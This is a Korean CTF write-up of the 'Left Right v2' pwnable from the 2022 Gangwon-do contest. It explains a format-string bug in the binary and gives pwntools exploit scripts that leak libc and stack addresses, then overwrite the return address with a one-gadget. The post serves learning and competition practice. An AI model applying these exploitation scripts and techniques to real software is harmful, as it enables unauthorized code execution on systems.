---
layout: post
title: [GCHD] Left Right v2
subtitle: 2022 Gang-Won-Do CTF
categories: CTF
tags: [Pwnable, Shell, Pentest]
---

**본 문제는 강원도 사이버 해킹방어대회 본선 문제입니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

**해당 문제 풀이 하는데에 있어서 도움을 주신 wyv3rn님께 감사드립니다 (아저씨의 흔한 취미. wyv3rn#1249)**

## 문제 분석

* **checksec**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/204086090-ae541b40-f9c7-4e68-b826-765f03d5b834.jpg" width = 400>
</p>

모든 보호기법이 적용되어 있고, Full Relro 우회를 위해 `free()` hook overwrite 시나리오를 계획하고 있다.

### **main**

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Left Right Game!!! Go to the point 'H' and come back to point 'S'");
  current_position = 0;
  half_check = 0;
  is_end = 0;
  move_count = 0;
  print_map(0LL);
  main_banner();
  while ( read_input("opt >> ") )
  {
    game();
    if ( is_end == 1 )
    {
      message = "What's your name? ";
      v3 = strlen("What's your name? ");
      write(1, message, v3);
      read(0, buf, 0x20uLL);
      putchar(10);
      puts("Hall Of Fame");
      puts("=======================");
      printf(buf);
      puts("=======================");
      puts("Game will be restart");
      current_position = 0;
      half_check = 0;
      is_end = 0;
      move_count = 0;
      print_map(0LL);
    }
    main_banner();
  }
  return 0;
}
```

메인에는 `print(buf);`로 **FSB**가 가능할 것으로 보인다. 이후 함수들은 `game()` 내부에서 작동하는 함수들이다.

`is_end`의 변수가 1일 경우 buf에 총 32byte값 만큼 입력할 수 있고, **FSB**를 유발할 수 있다. 이 변수는 아래에서 설명할 **is_end_check** 함수 내부에서 작동한다.

### **game**

```C
unsigned __int64 game()
{
  int input; // eax
  unsigned int v2; // [rsp+4h] [rbp-2Ch]
  __int64 (__fastcall *v3)(); // [rsp+8h] [rbp-28h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  game_banner();
  input = read_input("way >> ");
  if ( input == 1 )
  {
    v3 = move_right;
  }
  else if ( input == 2 )
  {
    v3 = move_left;
  }
  v2 = read_input("move >> ");
  (v3)(v2);
  return __readfsqword(0x28u) ^ v4;
}
```

### **read_input**

```C
int __fastcall read_input(const char *a1)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts(a1);
  fflush(stdout);
  read(0, buf, 0x28uLL);
  return atoi(buf);
}
```

### **move_right**

```C
__int64 __fastcall move_right(unsigned int a1)
{
  current_position += valid_check(a1);
  ++move_count;
  if ( current_position > 31 )
  {
    current_position = 31;
    half_check = -559038737;
  }
  return print_map((unsigned int)current_position);
}
```

`current_position` 변수가 31 이상이면 `half_check = -559038737;`로 할당하는데 이것은 pwndbg로 확인해보면 해당 값은 **0xdeadbeef**이다.

### **move_left**

```C
__int64 __fastcall move_left(unsigned int a1)
{
  int v2; // [rsp+Ch] [rbp-4h]

  v2 = valid_check(a1);
  ++move_count;
  current_position -= v2;
  if ( current_position - v2 < 0 )
    current_position = 0;
  return print_map(current_position);
}
```

`current_position` 변수가 움직이는 칸에 해당하는 `v2`를 뺏을 때 음수 일 경우 0으로 초기화한다.

### **print_map**

```C
__int64 __fastcall print_map(int a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  printf("<S>->");
  for ( i = 0; i <= 31; ++i )
  {
    if ( i == a1 )
      printf("[*]");
    else
      printf("[ ]");
  }
  puts("<-<H>");
  fflush(stdout);
  return is_end_check();
}
```

### **is_end_check**

```C
int is_end_check()
{
  int result; // eax

  result = current_position;
  if ( !current_position )
  {
    result = half_check;
    if ( half_check == -559038737 )
    {
      result = puts("Good job!");
      is_end = 1;
    }
  }
  return result;
}
```

`current_position`가 0이며, `half_check = -559038737;` **0xdeadbeef**일 경우 Good job!을 출력하며 `is_end`를 1로 초기화한다.

### **valid_check** _(추가)_

```C
__int64 __fastcall valid_check(int a1)
{
  if ( a1 > 10 )
    puts("Max move 10!");
  return 10LL;
}
```

움직일 칸에 대한 입력 값을 검증하는데 출제자의 오류인지 무조건 **10**을 return 하게 되는 것을 뒤늦게 알았다.

## 문제 풀이

* **시나리오**

  1. FSB를 통한 Memory Leak

  2. RAO

  3. 실패 시 Free hook overwrite 유도를 위한 Free 함수

`half_check`를 위해 32칸을 move_right하고, `current_position`가 0이 되는 것을 위해 다시 32칸 move_left 하고자 한다.

### Memory Leak

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

def right():
    for i in range(3):
        p.sendlineafter('opt >>', str(1))
        p.sendlineafter('way >>', str(1))
        p.sendlineafter('move >>', str(1))
    p.sendlineafter('opt >>', str(1))
    p.sendlineafter('way >>', str(1))
    p.sendlineafter('move >>', str(1))

def left():
    for i in range(3):
        p.sendlineafter('opt >>', str(1))
        p.sendlineafter('way >>', str(2))
        p.sendlineafter('move >>', str(1))

def move():
    right()
    left()

p = process('./left_right_v2')
e = ELF('./left_right_v2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

move()

p.interactive()
```

`main()`에서 `printf(buf);`를 통해 **FSB**가 가능하므로 확인해본다.

```
pwndbg> context
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────
*RAX  0x0
 RBX  0x0
*RCX  0x7f8f3cdb2104 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x7f8f3d08f8c0 (_IO_stdfile_1_lock) ◂— 0x0
*RDI  0x7ffcd8af5d90 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x7f8f3d08e7e3 (_IO_2_1_stdout_+131) ◂— 0x8f8c0000000000a /* '\n' */
*R8   0x17
 R9   0x7f8f3d2b14c0 ◂— 0x7f8f3d2b14c0
 R10  0x7f8f3ce40bc0 (_nl_C_LC_CTYPE_class+256) ◂— add al, byte ptr [rax]
*R11  0x246
 R12  0x5584a3d81180 (_start) ◂— endbr64
 R13  0x7ffcd8af5ea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffcd8af5dc0 —▸ 0x5584a3d81760 (__libc_csu_init) ◂— endbr64
 RSP  0x7ffcd8af5d90 ◂— 0x4141414141414141 ('AAAAAAAA')
*RIP  0x5584a3d816c6 (main+262) ◂— call 0x5584a3d81130
```

> payload를 전송하고 `printf`에 break point를 걸고 stack을 확인해본 값이다.

```
Hall Of Fame
=======================
AAAAAAAAA|0x7f8f3d08e7e3|0x7f8f3d08f8c0|0x7f8f3cdb2104|0x17|0x7f8f3d2b14c0|0x4141414141414141|0x7c70257c70257c41|%\xa0^\xaf\xd8\xfc\x7f
=======================
```

우리가 넘겨주는 `AAAAAAAA`는 offset 6에서 가져오는 것을 알 수 있다. 마지막 Memory Leak이 일어나는 것을 알 수 있다. 해당 값이 어떤 것인지 알아본다.

[rbp-0x10]에 위치한 값으로 64bit 함수 호출 규약에 의해서 `rdi, rsi, rdx, rcx, r8, r9, rsp, rsp+0x8, rsp+0x10` 순으로 인자 값을 받아온다. (_대회에서 해당 내용을 잊고 진행하여 최종 익스플로잇을 실패했다._)

`printf` 직후 스택의 모습을 보면 아래와 같다.

```
───────────────────────────────[ STACK ]────────────────────────────────
00:0000│ rdi rsp 0x7ffcd8af5d90 ◂— 0x4141414141414141 ('AAAAAAAA')
01:0008│         0x7ffcd8af5d98 ◂— 0x7c70257c70257c41 ('A|%p|%p|')
02:0010│         0x7ffcd8af5da0 ◂— 0x70257c70257c7025 ('%p|%p|%p')
03:0018│         0x7ffcd8af5da8 ◂— 0x257c70257c70257c ('|%p|%p|%')
04:0020│         0x7ffcd8af5db0 —▸ 0x7ffcd8af5ea0 ◂— 0x1
05:0028│         0x7ffcd8af5db8 ◂— 0x44e72840f049a900
06:0030│ rbp     0x7ffcd8af5dc0 —▸ 0x5584a3d81760 (__libc_csu_init) ◂— endbr64
07:0038│         0x7ffcd8af5dc8 —▸ 0x7f8f3ccc3c87 (__libc_start_main+231) ◂— mov edi, eax
```

따라서, `0x4141414141414141`는 offset 6이고, memory leak이 가능한 `__libc_start_main+231`은 0x34 떨어진 즉, offset 13에 위치한다. 이로써 `%13$p`를 통해서 memory leak이 가능하다.

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

def right():
    for i in range(3):
        p.sendlineafter('opt >> \n', str(1))
        p.sendlineafter('way >> \n', str(1))
        p.sendlineafter('move >> \n', str(1))
    p.sendlineafter('opt >> \n', str(1))
    p.sendlineafter('way >> \n', str(1))
    p.sendlineafter('move >> \n', str(1))

def left():
    for i in range(3):
        p.sendlineafter('opt >> \n', str(1))
        p.sendlineafter('way >> \n', str(2))
        p.sendlineafter('move >> \n', str(1))

def move():
    right()
    left()

p = process('./left_right_v2')
e = ELF('./left_right_v2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = libc.symbols['__libc_start_main'] + 231
og_list = [0x4f2a5, 0x4f302, 0x10a2fc]

move()
payload = '%13$p'
p.sendlineafter("What's your name?", payload)
```

### RAO

이후, 우리는 RET에 값을 넣어야 하기에 offset 10의 값을 확인해보면 RET 주소와 `0xd8` 차이가 나는 것을 알 수 있기에 해당 값을 받아와 해당 위치에 **one gadget**을 write할 계획이다.

현재의 FSB offset이 6일 경우 **AAAAAAAA**라는 값을 넣고 FSB exploit을 진행하게 된다면 `AAAAAAAA%6$n` 이미 입력한 AAAAAAAA에 또 다시 AAAAAAAA를 넣게 된다는 것이다.

그렇다면 해당 offset을 변경하여 우리가 변경할 주소를 넣어야 한다.

아래는 `%100c%7$hnn\x11\x22\x33` fsb 진행했을 때의 printf의 스택 모양을 표현한 것이다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/204457547-30ff5c9b-2cd0-41db-9dfc-f86d4f457ed2.jpg" width = 360>
</p>

`%100c`에 해당하는 포맷을 offset 7에 넣게 된다면 `hnn\x11\x22\x33`에 넣게 된다. 그렇다면 입력 값을 offset 6과 offset 7에 사용하지 못하게 된다.

offset 8을 사용하기 위해서는 아래와 같은 스택으로 페이로드를 짜면 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/204460537-18d84beb-03d3-409b-bc99-8724cb60e090.jpg" width = 360>
</p>

`%100c%8$hnnAAAAA\x11\x22\x33`과 같은 페이로드를 작성하였을 때의 모습이다. 이렇게 된다면 %100c에 해당하는 포맷을 `\x11\x22\x33`에 주소에 덮어 씌울 수 있게 된다.

이렇게 padding이 존재하지 않을 경우 넣고자 하는 offset에 들어가지 않기에 필수적으로 필요하다.

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

def right():
    for i in range(3):
        p.sendlineafter('opt >> \n', str(1))
        p.sendlineafter('way >> \n', str(1))
        p.sendlineafter('move >> \n', str(1))
    p.sendlineafter('opt >> \n', str(1))
    p.sendlineafter('way >> \n', str(1))
    p.sendlineafter('move >> \n', str(1))

def left():
    for i in range(3):
        p.sendlineafter('opt >> \n', str(1))
        p.sendlineafter('way >> \n', str(2))
        p.sendlineafter('move >> \n', str(1))

def move():
    right()
    left()

p = process('./left_right_v2')
e = ELF('./left_right_v2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = libc.symbols['__libc_start_main'] + 231
og_list = [0x4f2a5, 0x4f302, 0x10a2fc]

move()
payload = '%13$p'
p.sendlineafter("What's your name?", payload)
p.recvuntil('=======================\n')

leak = int(p.recvuntil(b'\n')[:-1],16)

lb = leak - main
og = lb + og_list[0]

move()
payload = '%10$p'
p.sendlineafter("What's your name?", payload)
p.recvuntil('=======================\n')

ret = int(p.recvuntil(b'\n')[:-1],16) - 0xd8

slog('libc_base', lb)
slog('one-gadget', og)
slog('ret', ret)

move()
payload = b'%' + bytes(str(int((hex(og)[12:]),16)),'utf-8') + b'c%8$hhn'
payload += b'A' * (8 - len(payload) % 8)
payload += p64(ret)
p.sendlineafter(b'name? ',payload)

move()
payload = b'%' + bytes(str(int((hex(og)[10:12]),16)),'utf-8') + b'c%8$hhn'
payload += b'A' * (8 - len(payload) % 8)
payload += p64(ret + 1)
p.sendlineafter(b'name? ',payload)

move()
payload = b'%' + bytes(str(int((hex(og)[8:10]),16)),'utf-8') + b'c%8$hhn'
payload += b'A' * (8 - len(payload) % 8)
payload += p64(ret + 2)
p.sendlineafter(b'name? ',payload)

move()
payload = b'%' + bytes(str(int((hex(og)[6:8]),16)),'utf-8') + b'c%8$hhn'
payload += b'A' * (8 - len(payload) % 8)
payload += p64(ret + 3)
p.sendlineafter(b'name? ',payload)

p.interactive()
```